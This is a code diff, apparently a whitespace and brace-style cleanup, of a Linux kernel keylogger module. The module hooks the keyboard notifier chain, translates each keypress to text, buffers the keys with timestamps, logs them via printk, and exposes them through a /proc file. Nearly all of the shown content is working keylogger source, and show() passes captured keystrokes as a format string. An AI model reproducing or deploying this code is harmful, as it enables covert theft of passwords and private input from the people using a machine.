@@ -35,29 +35,36 @@ static void store_time_in_buffer(struct timespec * current_time);
 #define PROC_NAME	"buffer_file"
 static int show(struct seq_file *m, void *v)
 {
-    seq_printf(m, key_buf.buffer);
-    return 0;
+	seq_printf(m, key_buf.buffer);
+	return 0;
 }
+
 static int open(struct inode *inode, struct  file *file)
 {
-    return single_open(file, show, NULL);
+	return single_open(file, show, NULL);
 }
+
 static const struct file_operations fops = {
-    .llseek = seq_lseek,
-    .open = open,
-    .owner = THIS_MODULE,
-    .read = seq_read,
-    .release = single_release,
+	.llseek = seq_lseek,
+	.open = open,
+	.owner = THIS_MODULE,
+	.read = seq_read,
+	.release = single_release,
 };
-static int create_keylogger_file(void){
+
+static int create_keylogger_file(void)
+{
 	struct proc_dir_entry *entry;
 	entry = proc_create(PROC_NAME, 0, NULL,&fops);
-		if (!entry){
-			return -ENOMEM;
-		}
-		return 0;
+
+	if (!entry){
+		return -ENOMEM;
+	}
+	return 0;
 }
-static void remove_keylogger_file(void) {
+
+static void remove_keylogger_file(void)
+{
 	remove_proc_entry(PROC_NAME, NULL);
 }
 
@@ -107,59 +114,54 @@ static struct notifier_block keylogger_blk = {
 };
 
 
-/* This is where the keylogging is handled*/
+/* This is where the keylogging is handled */
 int log_keys(int keycode, int shift_mask)
 {
+	size_t key_length;
+	getnstimeofday(our_current_time);
 
-		size_t key_length;
-		getnstimeofday(our_current_time);
+	/*handling unwanted keystrokes*/
+	if (keycode == 42 || keycode == 62 || keycode == 29 || (keycode >= 102 && keycode <= 110)) {
+		return NOTIFY_OK;
+	}
 
+	if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
+		const char *us_key = (shift_mask == 1)
+		? us_keymap[keycode][1]
+		: us_keymap[keycode][0];
 
-		/*handling unwanted keystrokes*/
-		if (keycode == 42 || keycode == 62 || keycode == 29 || (keycode >= 102 && keycode <= 110)){
+		printk(KERN_INFO "Key: %s",us_key);
+
+		key_length = strlen(us_key);
+
+		if ( key_length < 1) {
 			return NOTIFY_OK;
 		}
 
-		if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
-			const char *us_key = (shift_mask == 1)
-			? us_keymap[keycode][1]
-			: us_keymap[keycode][0];
-
-            printk(KERN_INFO "Key: %s",us_key);
-
-			key_length = strlen(us_key);
-
-			if ( key_length < 1) {
-				return NOTIFY_OK;
+		/*Handle backspace*/
+		if (strcmp(us_key,"_BACKSPACE_") == 0) {
+			if (key_buf.pos >= 1 && key_buf.buffer[key_buf.pos-1]!='\n') {
+				printk(KERN_INFO "DELETE");
+				key_buf.buffer[--key_buf.pos] = 0;
 			}
-
-
-			/*Handle backspace*/
-			if (strcmp(us_key,"_BACKSPACE_") == 0){
-				if (key_buf.pos >= 1 && key_buf.buffer[key_buf.pos-1]!='\n') {
-
-					printk(KERN_INFO "DELETE");
-					key_buf.buffer[--key_buf.pos] = 0;
-				}
-				return NOTIFY_OK;
-			}
-
-
-			if((key_buf.pos + key_length >= BUF_SIZE)){
-				key_buf.pos = 0;
-			}
-
-			memcpy(key_buf.buffer + key_buf.pos, us_key, key_length);
-			key_buf.pos += key_length;
-
+			return NOTIFY_OK;
 		}
-		
-		// If time increment has passed write timelog to file
-		if (our_current_time->tv_sec - key_buf.last_write >= WRITE_INCREMENT) {
-			store_time_in_buffer(our_current_time);
-		}
-		return NOTIFY_OK;
 
+
+		if ((key_buf.pos + key_length >= BUF_SIZE)) {
+			key_buf.pos = 0;
+		}
+
+		memcpy(key_buf.buffer + key_buf.pos, us_key, key_length);
+		key_buf.pos += key_length;
+
+	}
+	
+	// If time increment has passed write timelog to file
+	if (our_current_time->tv_sec - key_buf.last_write >= WRITE_INCREMENT) {
+		store_time_in_buffer(our_current_time);
+	}
+	return NOTIFY_OK;
 }
 
 int keylogger_callback(struct notifier_block *nblock,
@@ -169,35 +171,29 @@ int keylogger_callback(struct notifier_block *nblock,
 	struct keyboard_notifier_param *param = _param;
 
 	/* Trace only when a key is pressed down */
-	if (!(param->down))
+	if (!(param->down)) {
 		return NOTIFY_OK;
+	}
 
 	/* Convert logged keycode to readable string and store inside buffer */
 	return log_keys(param->value, param->shift);
-
 }
 
-/*
-Used to store current time into the buffer 
-*/
+/* Used to store current time into the buffer */
 void store_time_in_buffer(struct timespec * current_time){
 	size_t timestring_length;
-	key_buf.last_write = current_time-> tv_sec;
+	key_buf.last_write = current_time->tv_sec;
 	memset(key_buf.time_string,0,strlen(key_buf.time_string));
 	sprintf(key_buf.time_string,"\r[TIME-LOG (time_t): %ld]\n",(key_buf.last_write));
 	
 	timestring_length = strlen(key_buf.time_string);
 
-	if((key_buf.pos + timestring_length >= BUF_SIZE)){
+	if ((key_buf.pos + timestring_length >= BUF_SIZE)) {
 		key_buf.pos = 0;
 	}
 	memcpy(key_buf.buffer + key_buf.pos, key_buf.time_string , timestring_length);
 	key_buf.pos += timestring_length;
 }
-
-
-
-
 
 
 static int init_keylogger(void)
@@ -211,10 +207,7 @@ static int init_keylogger(void)
 	printk(KERN_INFO "[TIME-LOG (time_t): %s]\n",(key_buf.time_string));
 
 	return create_keylogger_file();
-
 }
-
-
 
 static void remove_keylogger(void)
 {
